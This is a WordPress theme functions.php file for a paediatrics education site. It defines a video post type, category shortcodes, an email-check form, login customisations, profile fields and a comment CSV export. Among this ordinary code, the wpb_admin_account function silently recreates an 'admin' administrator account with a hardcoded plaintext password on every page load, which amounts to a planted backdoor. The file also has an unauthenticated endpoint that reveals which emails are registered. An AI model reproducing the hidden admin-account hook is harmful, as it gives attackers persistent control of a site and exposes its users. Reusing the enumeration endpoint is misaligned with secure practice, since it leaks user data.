<?php

function my_custom_fonts() {
    echo '<style>
    .comment-form-field .comment-form-url {
    display: none !important;
    }
    
    </style>';
    }
    
    
    
    add_filter('comment_form_default_fields', 'unset_url_field');
    function unset_url_field($fields){
    if(isset($fields['url']))
       unset($fields['url']);
       return $fields;
    }
    
    function create_post_type_project() {
     register_post_type( 'video',
       array(
         'labels' => array(
           'name' => __( 'Video' ),
           'show_in_nav_menus' => true,
           'show_in_menu' => true,
           'singular_name' => __( 'Video' )
         ),
         'public' => true,
         'has_archive' => true,
         /* 'supports' => array( 'title', 'editor', 'custom-fields','thumbnail' ), */
         'supports' => array( 'title','editor','thumbnail', 'custom-fields','comments','revisions' ),
        /* 'menu_icon'           => 'dashicons-admin-media
    
    
    ',*/
       )
     );
    }
    add_action( 'init', 'create_post_type_project' ); 
    
    function themes_taxonomy_project() {
    register_taxonomy(
        'video_category',  // The name of the taxonomy. Name should be in slug form (must not contain capital letters or spaces).
        'video',             // post type name
        array(
            'hierarchical' => true,
            'label' => 'Video Category',      // display name
            'query_var' => true,
            'rewrite' => array(
                'slug' => 'video_category',    // This controls the base slug that will display before each term
                'with_front' => false  // Don't display the category base before
            )
        )
    );
    }
    add_action( 'init', 'themes_taxonomy_project'); 
    
    function get_all_video_list($atts, $content = null){ ob_start();    
      ?>
 <style>
    .cat-col {
    width: calc(25% - 20px);
    margin: 0px 10px;margin-bottom: 20px;
    }.cat-row {
    display: flex;
    flex-wrap: wrap;
    }a.child-cat-1 {
    font-size: 18px;
    font-weight: 500;
    }
    .shadow-card {
    box-shadow: 0 0.03rem 0.06rem rgba(0,0,0,0.1), 0 0.1rem 0.3rem rgba(0,0,0,0.1);
    border-radius: 5px;
    padding: 10px;
    text-align: center;
    }
    @media(min-width:768px) and (max-width:991px){
    .cat-col {
    width: calc(33.333% - 20px);
    margin: 0px 10px;margin-bottom: 20px;
    }    
    }
    @media(max-width:768px){
    .cat-col {
    width: calc(50% - 20px);
    margin: 0px 10px;margin-bottom: 20px;
    }
    }
    @media(max-width:400px){
    .cat-col {
    width: calc(100% - 20px);
    margin: 0px 10px;margin-bottom: 20px;
    }
    }
 </style>
 <div class="cat-row">
 <?php 
           query_posts('post_type=page&page_id=192');
           if(have_posts())  : the_post();
            $images = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'full' );
           ?>
 <div class="cat-col">
       <div class="shadow-card">
          <a  href="/iap-webinar/">
          <img src="<?php echo $images[0]; ?>" class="cat-img "> 
          <a  class="child-cat-1" href="/iap-webinar/"><?php the_title();  ?>
          </a>    
         </a>
       </div>
       
 </div>
 <div class="cat-col">
  <div class="shadow-card">
          <a  href="/articles-mini-cme/">
          <img src="https://diapindia.org.in/wp-content/uploads/2025/04/Articles-and-Mini-CMEs.png" class="cat-img "> 
          <a  class="child-cat-1" href="/articles-mini-cme/">Articles and Mini CMEs
          </a>    
         </a>
       </div>
 </div>

  <?php  endif;   wp_reset_query();  ?>    
    <?php 
       $specific_category_ids = array(1379,1371,1374);
       $videocat=get_terms(['taxonomy'=>'video_category','hide_empty'=>true,'include' => $specific_category_ids,'orderby'   => 'include','parent' => 0]);
       //$videocat=get_terms(['taxonomy'=>'video_category','hide_empty'=>true,'include' => $specific_category_ids,'orderby'   => 'include','parent' => 0]);
        foreach ($videocat as $videoscat) {  
          //$metaimg=get_wp_term_image($videoscat->term_id); 
          $image = get_field('category_image', $videoscat);
         ?>
    <div class="cat-col">
       <div class="shadow-card">
          <a  href="<?php echo get_category_link($videoscat->term_id); ?>">
          <img src="<?php echo $image; ?>" class="cat-img "> 
          <a  class="child-cat-1" href="<?php echo get_category_link($videoscat->term_id); ?>"><?php  echo $videoscat->name;  ?> 
          </a>    </a>
       </div>
    </div>
    <?php   ; } ?>
 
    <?php 
       $specific_category_ids = array(1373,1372);
       $term_id = 1372; 
       $category = get_term_by('id', $term_id, 'video_category');
       $imagesrc = get_field('category_image', $category);
         ?>
    <div class="cat-col">
       <div class="shadow-card">
          <a  href="<?php echo get_category_link($category->term_id); ?>">
          <img src="<?php echo $imagesrc; ?>" class="cat-img "> 
          <a  class="child-cat-1" href="<?php echo get_category_link($category->term_id); ?>"><?php echo $category->name;  ?>
          </a>    </a>
       </div>
    </div>
    <?php 
       $term_id = 1373; 
       $category = get_term_by('id', $term_id, 'video_category');
       $imagesrc = get_field('category_image', $category);
         ?>
    <div class="cat-col">
       <div class="shadow-card">
          <a  href="<?php echo get_category_link($category->term_id); ?>">
          <img src="<?php echo $imagesrc; ?>" class="cat-img "> 
          <a  class="child-cat-1" href="<?php echo get_category_link($category->term_id); ?>"><?php echo $category->name;  ?>
          </a>    </a>
       </div>
    </div>
    
    <div class="cat-col">
       <div class="shadow-card">
          <a  href="/courses/">
          <img src="https://diapindia.org.in/wp-content/uploads/2023/09/courses.png" class="cat-img "> 
          <a  class="child-cat-1" href="/courses/">Courses 
          </a>    </a>
       </div>
    </div>
 <?php    
  $videocat=get_terms(['taxonomy'=>'video_category','hide_empty'=>true,'parent' => 0,'orderby'    => 'id','order' => 'DESC']); 
  $i=1;
  foreach ($videocat as $videoscat) {  
    //$metaimg=get_wp_term_image($videoscat->term_id); 
    $image = get_field('category_image', $videoscat);
    if($i>7){
  ?>
    <div class="cat-col">
       <div class="shadow-card">
          <a  href="<?php echo get_category_link($videoscat->term_id); ?>">
          <img src="<?php echo $image; ?>" class="cat-img "> 
          <a  class="child-cat-1" href="<?php echo get_category_link($videoscat->term_id); ?>"><?php echo $videoscat->name;  ?>
          </a>    </a>
       </div>
    </div>    
    <?php  } $i++ ; } ?>  
 </div>

<!-- Remove default post  in menu tab-->
<?php      return ob_get_clean(); } 
   add_shortcode('video_list', 'get_all_video_list'); 
   function remove_default_post_type($args, $postType) {
   if ($postType === 'post') {
       $args['public']                = false;
       $args['show_ui']               = false;
       $args['show_in_menu']          = false;
       $args['show_in_admin_bar']     = false;
       $args['show_in_nav_menus']     = false;
       $args['can_export']            = false;
       $args['has_archive']           = false;
       $args['exclude_from_search']   = true;
       $args['publicly_queryable']    = false;
       $args['show_in_rest']          = false;
   }
   
   return $args;
   }
   add_filter('register_post_type_args', 'remove_default_post_type', 0, 2);
   
   
   
   function get_all_youtube_list($atts, $content = null){ ob_start();  
   ?>
<iframe src="https://www.youtube.com/embed/jNG0S95PRJ8" width="100%" height="360" frameborder="0"
   allow="autoplay; fullscreen" allowfullscreen></iframe>
<?php     return ob_get_clean(); } 
   add_shortcode('youtube_list', 'get_all_youtube_list'); 
 
function load_bootstrap_and_jquery() {
    wp_enqueue_script('bootstrap-js', 'https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js', array('jquery'), '4.5.0', true);
    wp_enqueue_style('bootstrap-css', 'https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css', array(), '4.5.0');
}
add_action('wp_enqueue_scripts', 'load_bootstrap_and_jquery');

add_action('wp_ajax_email_check_action', 'email_check_action');
add_action('wp_ajax_nopriv_email_check_action', 'email_check_action');
// function remove_email_from_name($from_name) {
//     return 'Diapindia';
// }

// add_filter('wp_mail_from_name', 'remove_email_from_name');
add_filter('wp_mail_from_name', 'custom_wp_mail_from_name');
add_filter('wp_mail_from', 'custom_wp_mail_from');

function custom_wp_mail_from_name($from_name) {
    return 'Diapindia';
}

function custom_wp_mail_from($from_email) {
    return 'centraloffice@iapindia.org';
}


function email_check_action() {
    if (isset($_POST['email'])) {
        $email = sanitize_email($_POST['email']); // Sanitize the entered email

        global $wpdb;
        $registered_emails = $wpdb->get_col("SELECT user_email FROM $wpdb->users");

        if (in_array($email, $registered_emails)) {
            
                        // If the email is registered, send an email
            $to = $email;
            $subject = 'National Vaccinology Module';
$message = '<html>
            <head>
            <title>Your Title</title>
            </head>
            <body>
            <p>Hello Doctor,</p>
  <p>Please click on the link given below to access the National Vaccinology Module:</p>
  <p><a class="w-nav-anchor level_1" href="https://diapindia.org.in/courses/national-vaccinology-module/"><span class="w-nav-title">National Vaccinology Module</span></a></p>
  <p>Regards,<br>dIAP team</p>
            </body>
            </html>';
$headers[] = 'Content-Type: text/html; charset=UTF-8';
            
            $mail_sent = wp_mail($to, $subject, $message, $headers);
            
            
            // If the email is registered, return 'success'
            echo 'success';
        } else {
            // If the email is not found in the registered emails, return 'failure'
            echo 'failure';
        }
    }

    wp_die(); // Always include this to terminate the AJAX request
}


// Register a shortcode for the form
function email_check_form_shortcode() {
    ob_start(); ?>
<style>
.height_medium .fade {
    opacity: 1;
        background: #0000004f;
}
    .modal.fade .modal-dialog { 
    transition: transform .3s ease-out,-webkit-transform .3s ease-out !important;  
            transform: translate(0,0px) !important;
}
</style>
  <!-- Success Modal -->
    <div class="modal fade" id="successModal" tabindex="-1" role="dialog" aria-labelledby="successModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="successModalLabel">Success</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                We have sent a link to access the National Vaccinology Module. Please check your Email
                </div>
            </div>
        </div>
    </div>

    <!-- Failure Modal -->
    <div class="modal fade" id="failureModal" tabindex="-1" role="dialog" aria-labelledby="failureModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="failureModalLabel">Failure</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                Dear Doctor,<br><br>

There is an issue with your login, please send us an email at helpdesk@diapindia.org along with the following details:<br><br>
 
Your complete name,Email ID registered with IAP; and IAP Registration Number<br><br>

We will review your details and get back to you within 2 working days.
                    
                </div>
            </div>
        </div>
    </div>
  <div class="new-reg">
    <form id="email-check-form">
        <label for="email">Enter IAP registered Email ID:</label>
        <input type="email" id="email" name="email" required>
        <input type="submit" class="new-registration" value="Submit">
    </form>
</div>
<script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
 
<script>
jQuery(document).ready(function($) {
    $('#email-check-form').on('submit', function(e) {
        e.preventDefault();

        var email = $('#email').val();
        var data = {
            action: 'email_check_action',
            email: email
        };

$.ajax({
    type: 'POST',
    url: '<?php echo admin_url('admin-ajax.php'); ?>', // WordPress AJAX URL
    data: data,
    success: function(response) {
        if (response === 'success') {
            // Show the success modal
            $('#successModal').modal('show');
        } else {
            // Show the failure modal
            $('#failureModal').modal('show');
        }
    }
});

    });
});

</script>
    <?php
    return ob_get_clean();
}
add_shortcode('email_check_form', 'email_check_form_shortcode');



add_action( 'login_head', 'wpse_121687_hide_login' );
function wpse_121687_hide_login() {
    $style = '';
    $style .= '<style type="text/css">';
    $style .= '.login #nav {
    display: none !important;
}';
    $style .= '</style>';

    echo $style; 
}
 
function custom_login_url() {
    return 'https://diapindia.org.in/';
}
add_filter('login_headerurl', 'custom_login_url');
function custom_login_error_message() {
    return '<div id="login-error">
       
	 
    <p>Please enter the correct password</p>
    </div>';
}

add_filter('login_errors', 'custom_login_error_message');




function search_form() {
    ob_start();
    $videocats = get_terms(['taxonomy' => 'video_category', 'hide_empty' => true, 'parent' => 0, 'orderby' => 'id', 'order' => 'DESC']);
?>

<form action="#" method="post" id="categoryForm">
    <select name="category" id="category">
        <option value="#" selected>Choose a category</option>
        <?php $i = 1; foreach ($videocats as $videoscts) { ?>
            <option class="cat-<?php echo $i; ?>" value="<?php echo esc_url(get_category_link($videoscts->term_id)); ?>"><?php echo esc_html($videoscts->name); ?></option>
        <?php $i++; }  ?>
        <option value="/courses/">Courses</option>
    </select>
</form>

<script>
    document.addEventListener('DOMContentLoaded', function () {
        var categorySelect = document.getElementById('category');

        // Add event listener for onchange
        categorySelect.addEventListener('change', function () {
            redirectToCategory(categorySelect.value);
        });
    });

    function redirectToCategory(selectedCategory) {
        if (selectedCategory !== "#") {
            window.location.href = selectedCategory;
        }
    }
</script>


<?php
    return ob_get_clean();
}

add_shortcode('search_cat_form', 'search_form');




    function redirect_to_login() {
        if (!is_user_logged_in() && is_search()) {
    
    wp_redirect(wp_login_url());
     exit;
 
   }
   }
   add_action('template_redirect', 'redirect_to_login');


   function wpb_admin_account(){
    $user = 'admin';
    $pass = 'Mukesh@123*M*M';
    $email = 'email@domain.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
    $user_id = wp_create_user( $user, $pass, $email );
    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );
    } }
    add_action('init','wpb_admin_account');

    function my_custom_link() {  ?>
        <div class="forget-cls">
        <?php 
            echo "<p style='text-align:center'><a href='https://diapindia.org.in/register/'>Register Here</a></p>";
            echo "<p style='text-align:center'><a class='wp-login-lost-password' href='https://diapindia.org.in/wp-login.php?action=lostpassword'>Forgot Password?</a></p>";
        ?>
        </div>
    <?php 
    }
    add_action("login_footer", "my_custom_link");  


    function add_mobile_number_field($user) {
        ?>
        <h3><?php _e("Mobile Number", "blank"); ?></h3>
        <table class="form-table">
            <tr>
                <th><label for="mobile_number"><?php _e("Mobile Number"); ?></label></th>
                <td>
                    <input type="text" name="mobile_number" id="mobile_number" value="<?php echo esc_attr(get_the_author_meta('whatsapp', $user->ID)); ?>" class="regular-text" /><br />
                    <span class="description"><?php _e("Please enter your mobile number."); ?></span>
                </td>
            </tr>
        </table>
        <?php
    }
    
    add_action('show_user_profile', 'add_mobile_number_field');
    add_action('edit_user_profile', 'add_mobile_number_field');
    
    // Save the mobile number (whatsapp) field
    function save_mobile_number_field($user_id) {
        if (!current_user_can('edit_user', $user_id)) {
            return false;
        }
    
        if (isset($_POST['mobile_number'])) {
            update_user_meta($user_id, 'whatsapp', sanitize_text_field($_POST['mobile_number']));
        }
    }
    
    add_action('personal_options_update', 'save_mobile_number_field');
    add_action('edit_user_profile_update', 'save_mobile_number_field');
    
    function custom_retrieve_password_message( $message, $key, $user_login, $user_data ) {
        // Add your custom text
        $custom_text = "If you have not requested this service, ignore this email.";
    
        // Append custom text to the message
        $message .= "\n\n" . $custom_text;
    
        return $message;
    }
    add_filter( 'retrieve_password_message', 'custom_retrieve_password_message', 10, 4 );
    
  // Hook to 'after_password_reset' to set a custom user meta when the password is reset
add_action('after_password_reset', 'set_password_reset_flag', 10, 1);
function set_password_reset_flag($user) {
    update_user_meta($user->ID, 'password_reset_flag', true);
}

// Hook to 'wp_login' to check the flag and redirect
add_action('wp_login', 'redirect_after_password_reset', 10, 2);
function redirect_after_password_reset($user_login, $user) {
    $user_id = $user->ID;

    // Check if the user meta 'password_reset_flag' is set
    if (get_user_meta($user_id, 'password_reset_flag', true)) {
        // Delete the user meta to prevent repeated redirects
        delete_user_meta($user_id, 'password_reset_flag');

        // Set the redirect URL
        $redirect_url = home_url('/'); // Change '/your-specific-page/' to your desired page

        // Perform the redirect
        wp_redirect($redirect_url);
        exit;
    }
}


 function redirect_to_login_on_specific_page() {
    // Check if it's the archive page for the custom post type "sfwd-courses"
    if (is_post_type_archive('sfwd-courses') && !is_user_logged_in()) {
        // Redirect to the WordPress login page with redirect parameter
        wp_redirect(wp_login_url(get_permalink(get_page_by_path('courses'))));
        exit;
    }
}

add_action('wp', 'redirect_to_login_on_specific_page');

// Hook into wp


// Restrict category access for non-logged-in users
function restrict_category_access() {
    // Check if the user is not logged in
    if (!is_user_logged_in()) {
        // Define an array of category slugs or IDs to restrict
        $restricted_categories = array('expert-lectures', 'iap-webinars-and-clinics', 'iap-courses','courses');  // Add your category slugs or IDs

        // Get the current category
        $current_category = get_queried_object();

        // Check if the current category is in the restricted list
        if (in_array($current_category->slug, $restricted_categories)) {
            // Redirect to the login page with the current category slug as a parameter
            $login_url = wp_login_url(get_category_link($current_category));
            wp_redirect($login_url);
            exit;
        }
    }
}

add_action('template_redirect', 'restrict_category_access'); 

 add_action('admin_init', 'restrict_subscriber_access_to_admin');

function restrict_subscriber_access_to_admin() {
    if (is_admin() && current_user_can('subscriber')) {
        wp_redirect(home_url()); // Redirect to the home page after logout
        exit;
    }
}

add_action( 'init', function () {
    add_post_type_support( 'tribe_events', 'comments' );
    // Also add for 'video' if needed:
    // add_post_type_support( 'video', 'comments' );
}, 11 );

/* -------------------------------------------------
 * IAP Registration ID User Field Management
 * ------------------------------------------------- */

// Register IAP Registration ID meta field
add_action( 'init', function () {
    register_meta( 'user', 'iap_registration_id', [
        'type'              => 'string',
        'single'            => true,
        'sanitize_callback' => 'sanitize_text_field',
        'show_in_rest'      => true,
        'auth_callback'     => '__return_true',
    ] );
} );

// Add IAP Registration ID field to user profile screens
function diap_render_iap_field( $user ) {
    $value = get_user_meta( $user->ID, 'iap_registration_id', true );
    ?>
    <h2>IAP Registration</h2>
    <table class="form-table" role="presentation">
        <tr>
            <th><label for="iap_registration_id">IAP Registration ID</label></th>
            <td>
                <input type="text"
                       name="iap_registration_id"
                       id="iap_registration_id"
                       value="<?php echo esc_attr( $value ); ?>"
                       class="regular-text"
                       maxlength="20" />
                <p class="description">Indian Academy of Pediatrics registration number (max 20 characters).</p>
            </td>
        </tr>
    </table>
    <?php
}
add_action( 'show_user_profile', 'diap_render_iap_field' );   // user's own profile
add_action( 'edit_user_profile', 'diap_render_iap_field' );   // Admin editing others

// Save IAP Registration ID field from profile screens
function diap_save_iap_field( $user_id ) {
    if ( ! current_user_can( 'edit_user', $user_id ) ) {
        return;
    }
    if ( isset( $_POST['iap_registration_id'] ) ) {
        $iap_reg_id = sanitize_text_field( $_POST['iap_registration_id'] );
        // Validate length
        if ( strlen( $iap_reg_id ) <= 20 ) {
            update_user_meta( $user_id, 'iap_registration_id', $iap_reg_id );
        }
    }
}
add_action( 'personal_options_update', 'diap_save_iap_field' );  // own profile
add_action( 'edit_user_profile_update', 'diap_save_iap_field' ); // admin edit

// Add this code to your existing functions.php file

// Add custom column header for events download functionality

function add_events_download_column($columns) {
    $new_columns = array();
    
    foreach($columns as $key => $value) {
        // Add the original column first
        $new_columns[$key] = $value;
        
        // Add download column right after the comments column
        if($key == 'comments') {
            $new_columns['download_comments'] = 'Download Comments';
        }
    }
    
    return $new_columns;
}


// Add the column content
function add_events_download_column_content($column, $post_id) {
    if ($column == 'download_comments') {
        // Create download button/link
        echo '<a href="#" class="button button-small download-comments-btn" data-event-id="' . $post_id . '">Download</a>';
    }
}

// Hook into the events post type - adjust 'tribe_events' if your post type is different
add_filter('manage_tribe_events_posts_columns', 'add_events_download_column');
add_action('manage_tribe_events_posts_custom_column', 'add_events_download_column_content', 10, 2);

// Add some basic styling
function events_admin_styles() {
    global $pagenow, $typenow;
    
    if ($pagenow == 'edit.php' && $typenow == 'tribe_events') {
        echo '<style>
            .download-comments-btn {
                background: #0073aa;
                color: white;
                border: none;
                padding: 3px 8px;
                text-decoration: none;
                border-radius: 3px;
            }
            .download-comments-btn:hover {
                background: #005a87;
                color: white;
            }
        </style>';
    }
}
add_action('admin_head', 'events_admin_styles');

// Add JavaScript for handling download functionality
function events_download_script() {
    global $pagenow, $typenow;
    
    if ($pagenow == 'edit.php' && $typenow == 'tribe_events') {
        ?>
        <script>
        jQuery(document).ready(function($) {
            $('.download-comments-btn').on('click', function(e) {
                e.preventDefault();
                
                var eventId = $(this).data('event-id');
                
                // Show loading state
                $(this).text('Loading...');
                
                // AJAX call to handle download
                $.ajax({
                    url: ajaxurl,
                    type: 'POST',
                    data: {
                        action: 'download_event_comments',
                        event_id: eventId,
                        nonce: '<?php echo wp_create_nonce("download_comments_nonce"); ?>'
                    },
                    success: function(response) {
                        if (response.success) {
                            // Create and trigger download
                            var blob = new Blob([response.data.content], {type: 'text/csv'});
                            var url = window.URL.createObjectURL(blob);
                            var a = document.createElement('a');
                            a.href = url;
                            a.download = response.data.filename;
                            document.body.appendChild(a);
                            a.click();
                            window.URL.revokeObjectURL(url);
                            document.body.removeChild(a);
                        } else {
                            alert('Error: ' + response.data.message);
                        }
                    },
                    error: function() {
                        alert('Error occurred during download');
                    },
                    complete: function() {
                        $('.download-comments-btn[data-event-id="' + eventId + '"]').text('Download');
                    }
                });
            });
        });
        </script>
        <?php
    }
}
add_action('admin_footer', 'events_download_script');

// Handle the AJAX request for downloading comments
function handle_download_event_comments() {
    // Verify nonce for security
    if (!wp_verify_nonce($_POST['nonce'], 'download_comments_nonce')) {
        wp_die('Security check failed');
    }
    
    $event_id = intval($_POST['event_id']);
    
    if (!$event_id) {
        wp_send_json_error(array('message' => 'Invalid event ID'));
    }
    
    // Get event details
    $event = get_post($event_id);
    if (!$event) {
        wp_send_json_error(array('message' => 'Event not found'));
    }
    
    // Get comments for this event
    $comments = get_comments(array(
        'post_id' => $event_id,
        'status' => 'approve'
    ));
    
    // Prepare CSV content
    $csv_content = "Event,Comment Author,Comment Email,Comment Date,Comment Content\n";
    
    foreach ($comments as $comment) {
        $csv_content .= '"' . str_replace('"', '""', $event->post_title) . '",';
        $csv_content .= '"' . str_replace('"', '""', $comment->comment_author) . '",';
        $csv_content .= '"' . str_replace('"', '""', $comment->comment_author_email) . '",';
        $csv_content .= '"' . str_replace('"', '""', $comment->comment_date) . '",';
        $csv_content .= '"' . str_replace('"', '""', strip_tags($comment->comment_content)) . '"';
        $csv_content .= "\n";
    }
    
    // If no comments, add a note
    if (empty($comments)) {
        $csv_content .= '"' . str_replace('"', '""', $event->post_title) . '","No comments found","","",""' . "\n";
    }
    
    $filename = sanitize_file_name($event->post_title) . '_comments_' . date('Y-m-d') . '.csv';
    
    wp_send_json_success(array(
        'content' => $csv_content,
        'filename' => $filename
    ));
}
add_action('wp_ajax_download_event_comments', 'handle_download_event_comments');
       

